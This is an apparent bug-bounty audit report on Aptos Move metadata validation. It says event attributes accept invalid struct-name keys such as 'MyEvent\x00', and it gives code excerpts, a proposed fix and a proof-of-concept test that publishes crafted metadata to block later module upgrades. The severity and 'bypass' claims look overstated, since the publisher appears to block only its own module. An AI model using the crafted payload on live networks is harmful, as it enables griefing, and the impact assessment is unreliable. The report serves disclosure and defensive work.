# Audit Report

## Title
Event Attribute Duplicate Detection Bypass via Invalid Metadata Keys

## Summary
The `extract_event_metadata()` function's duplicate detection can be bypassed by an attacker who manually crafts module metadata with invalid struct name keys (e.g., containing null bytes or other non-identifier characters). This allows insertion of duplicate event attributes that block legitimate module upgrades.

## Finding Description

The event validation system has inconsistent validation compared to resource group attributes. In `verify_module_metadata_for_module_publishing()`, event attributes receive no validation that their struct names are valid Move identifiers or correspond to actual structs in the module bytecode. [1](#0-0) 

Resource group attributes are properly validated by calling `is_valid_resource_group()` which:
1. Validates the string is a valid Move identifier using `Identifier::new(struct_)`
2. Verifies the struct actually exists in the module's bytecode [2](#0-1) 

However, event attributes only check if the feature flag is enabled and skip all validation: [3](#0-2) 

This allows an attacker to publish a module where the `struct_attributes` BTreeMap contains entries like:
- `"MyEvent"` → `[KnownAttribute::event()]`
- `"MyEvent\x00"` (with null byte) → `[KnownAttribute::event()]`

These are different Rust strings, so the duplicate detection in `extract_event_metadata()` treats them as separate entries: [4](#0-3) 

The HashSet insertion succeeds for both strings since they differ, bypassing the intended duplicate detection at line 264.

During module upgrades, the compatibility check in `validate_module_events()` will fail when a legitimate upgrade (compiled normally) only has `"MyEvent"` but needs to satisfy removal of `"MyEvent\x00"` from the old module: [5](#0-4) 

## Impact Explanation

**Medium Severity** per Aptos bug bounty criteria: "State inconsistencies requiring intervention"

1. **Denial of Service**: Legitimate module upgrades are permanently blocked, requiring manual intervention or hardfork to recover
2. **Griefing Attack**: Malicious actors can pollute modules with invalid metadata that persists on-chain
3. **State Inconsistency**: Modules exist with semantically invalid metadata that violates the system's integrity assumptions

This does not directly cause fund loss or consensus violations, but creates a persistent attack vector affecting module upgradeability—a core blockchain functionality.

## Likelihood Explanation

**Moderate to High Likelihood:**

1. **Attack Prerequisites**: Attacker needs ability to publish modules (standard functionality) and capability to craft bytecode manually (bypassing the Move compiler)
2. **Detection Difficulty**: The malicious metadata passes all current validation checks
3. **Persistence**: Once published, the malformed metadata is permanent until manual intervention
4. **Attack Surface**: Any module with event attributes is vulnerable during upgrades

The attack is feasible for technically sophisticated attackers with knowledge of Move bytecode structure and BCS serialization.

## Recommendation

Add validation for event attributes matching the pattern used for resource groups. In `verify_module_metadata_for_module_publishing()`, validate that event attribute struct names:

1. Are valid Move identifiers
2. Correspond to actual structs in the module bytecode

Proposed fix in `types/src/vm/module_metadata.rs`:

```rust
for (struct_, attrs) in &metadata.struct_attributes {
    for attr in attrs {
        if features.are_resource_groups_enabled() {
            if attr.is_resource_group() && attr.get_resource_group().is_some() {
                is_valid_resource_group(&structs, struct_)?;
                continue;
            } else if attr.is_resource_group_member()
                && attr.get_resource_group_member().is_some()
            {
                is_valid_resource_group_member(&structs, struct_)?;
                continue;
            }
        }
        if features.is_module_event_enabled() && attr.is_event() {
            // ADD VALIDATION HERE
            if let Ok(ident_struct) = Identifier::new(struct_) {
                if structs.get(ident_struct.as_ident_str()).is_some() {
                    continue;
                }
            }
            return Err(AttributeValidationError {
                key: struct_.clone(),
                attribute: attr.kind,
            }
            .into());
        }
        return Err(AttributeValidationError {
            key: struct_.clone(),
            attribute: attr.kind,
        }
        .into());
    }
}
```

## Proof of Concept [6](#0-5) 

Using the existing test infrastructure pattern, create a test that:

1. Builds a module with struct `MyEvent`
2. Manually modifies metadata to insert two event attributes:
   - Key `"MyEvent"` with event attribute
   - Key `"MyEvent\x00"` with event attribute  
3. Publishes the module (should succeed, demonstrating bypass)
4. Attempts to upgrade with normally-compiled module
5. Observes upgrade failure with "Invalid change in event attributes"

```rust
#[test]
fn test_event_duplicate_encoding_bypass() {
    let mut h = MoveHarness::new();
    let account = h.new_account_at(AccountAddress::from_hex_literal("0xf00d").unwrap());
    
    // Build module with MyEvent struct
    let source = r#"
        module 0xf00d::M {
            struct MyEvent { value: u64 }
            public fun emit_event() {
                0x1::event::emit(MyEvent { value: 42 });
            }
        }
    "#;
    
    // Manually craft metadata with duplicate encodings
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();
    let package = BuiltPackage::build(path.path().to_path_buf(), BuildOptions::default()).unwrap();
    let code = package.extract_code();
    
    let mut compiled_module = CompiledModule::deserialize(&code[0]).unwrap();
    let mut metadata = RuntimeModuleMetadataV1 {
        error_map: BTreeMap::new(),
        struct_attributes: BTreeMap::new(),
        fun_attributes: BTreeMap::new(),
    };
    
    // Insert legitimate event attribute
    metadata.struct_attributes.insert(
        "MyEvent".to_string(), 
        vec![KnownAttribute::event()]
    );
    
    // Insert duplicate with null byte - bypasses detection!
    metadata.struct_attributes.insert(
        "MyEvent\x00".to_string(), 
        vec![KnownAttribute::event()]
    );
    
    // Serialize and publish
    let metadata_bytes = Metadata {
        key: APTOS_METADATA_KEY_V1.to_vec(),
        value: bcs::to_bytes(&metadata).unwrap(),
    };
    compiled_module.metadata = vec![metadata_bytes];
    
    let mut code_bytes = vec![];
    compiled_module.serialize(&mut code_bytes).unwrap();
    
    let package_metadata = bcs::to_bytes(&package.extract_metadata().unwrap()).unwrap();
    
    // Should succeed - demonstrating bypass
    let result = h.run_transaction_payload(
        &account,
        aptos_stdlib::code_publish_package_txn(package_metadata, vec![code_bytes]),
    );
    assert_success!(result);
    
    // Now attempt legitimate upgrade - should fail
    let upgrade_result = h.run_transaction_payload(
        &account,
        aptos_stdlib::code_publish_package_txn(
            bcs::to_bytes(&package.extract_metadata().unwrap()).unwrap(),
            package.extract_code()
        ),
    );
    
    // Upgrade blocked by malicious metadata!
    assert_vm_status!(upgrade_result, StatusCode::EVENT_METADATA_VALIDATION_ERROR);
}
```

## Notes

This vulnerability demonstrates a critical gap in metadata validation consistency. While Move identifiers are properly restricted to ASCII-only characters to avoid Unicode normalization issues, the event attribute validation fails to enforce these same restrictions on metadata keys. The fix should align event validation with the existing robust validation applied to resource group attributes.

### Citations

**File:** types/src/vm/module_metadata.rs (L398-421)
```rust
pub fn is_valid_resource_group(
    structs: &BTreeMap<&IdentStr, (&StructHandle, &StructDefinition)>,
    struct_: &str,
) -> Result<(), AttributeValidationError> {
    if let Ok(ident_struct) = Identifier::new(struct_) {
        if let Some((struct_handle, struct_def)) = structs.get(ident_struct.as_ident_str()) {
            let num_fields = match &struct_def.field_information {
                StructFieldInformation::Native | StructFieldInformation::DeclaredVariants(_) => 0,
                StructFieldInformation::Declared(fields) => fields.len(),
            };
            if struct_handle.abilities == AbilitySet::EMPTY
                && struct_handle.type_parameters.is_empty()
                && num_fields == 1
            {
                return Ok(());
            }
        }
    }

    Err(AttributeValidationError {
        key: struct_.to_string(),
        attribute: KnownAttributeKind::ViewFunction as u8,
    })
}
```

**File:** types/src/vm/module_metadata.rs (L494-516)
```rust
    for (struct_, attrs) in &metadata.struct_attributes {
        for attr in attrs {
            if features.are_resource_groups_enabled() {
                if attr.is_resource_group() && attr.get_resource_group().is_some() {
                    is_valid_resource_group(&structs, struct_)?;
                    continue;
                } else if attr.is_resource_group_member()
                    && attr.get_resource_group_member().is_some()
                {
                    is_valid_resource_group_member(&structs, struct_)?;
                    continue;
                }
            }
            if features.is_module_event_enabled() && attr.is_event() {
                continue;
            }
            return Err(AttributeValidationError {
                key: struct_.clone(),
                attribute: attr.kind,
            }
            .into());
        }
    }
```

**File:** aptos-move/aptos-vm/src/verifier/event_validation.rs (L69-76)
```rust
        if let Some(metadata) = old_module_metadata_if_exists {
            let original_event_structs = extract_event_metadata(&metadata)?;
            for member in original_event_structs {
                // Fail if we see a removal of an event attribute.
                if !new_event_structs.remove(&member) {
                    metadata_validation_err("Invalid change in event attributes")?;
                }
            }
```

**File:** aptos-move/aptos-vm/src/verifier/event_validation.rs (L258-270)
```rust
pub(crate) fn extract_event_metadata(
    metadata: &RuntimeModuleMetadataV1,
) -> VMResult<HashSet<String>> {
    let mut event_structs = HashSet::new();
    for (struct_, attrs) in &metadata.struct_attributes {
        for attr in attrs {
            if attr.is_event() && !event_structs.insert(struct_.clone()) {
                metadata_validation_err("Found duplicate event attribute")?;
            }
        }
    }
    Ok(event_structs)
}
```

**File:** aptos-move/e2e-move-tests/src/tests/attributes.rs (L293-341)
```rust
fn build_package_and_insert_attribute(
    source: &str,
    struct_attr: Option<(&str, FakeKnownAttribute)>,
    func_attr: Option<(&str, FakeKnownAttribute)>,
) -> (Vec<Vec<u8>>, Vec<u8>) {
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();

    let package = BuiltPackage::build(path.path().to_path_buf(), BuildOptions::default())
        .expect("building package must succeed");
    let code = package.extract_code();
    // There should only be one module
    assert!(code.len() == 1);
    let mut compiled_module = CompiledModule::deserialize(&code[0]).unwrap();
    let mut value = RuntimeModuleMetadataV1 {
        error_map: BTreeMap::new(),
        struct_attributes: BTreeMap::new(),
        fun_attributes: BTreeMap::new(),
    };

    if let Some((name, attr)) = struct_attr {
        let fake_attribute = bcs::to_bytes(&attr).unwrap();
        let known_attribute = bcs::from_bytes(&fake_attribute).unwrap();
        value
            .struct_attributes
            .insert(name.to_string(), vec![known_attribute]);
    };
    if let Some((name, attr)) = func_attr {
        let fake_attribute = bcs::to_bytes(&attr).unwrap();
        let known_attribute = bcs::from_bytes(&fake_attribute).unwrap();
        value
            .fun_attributes
            .insert(name.to_string(), vec![known_attribute]);
    }

    let metadata = Metadata {
        key: APTOS_METADATA_KEY_V1.to_vec(),
        value: bcs::to_bytes(&value).unwrap(),
    };

    compiled_module.metadata = vec![metadata];
    let mut code = vec![];
    compiled_module.serialize(&mut code).unwrap();
    let metadata = package
        .extract_metadata()
        .expect("extracting package metadata must succeed");
    (vec![code], bcs::to_bytes(&metadata).unwrap())
}
```
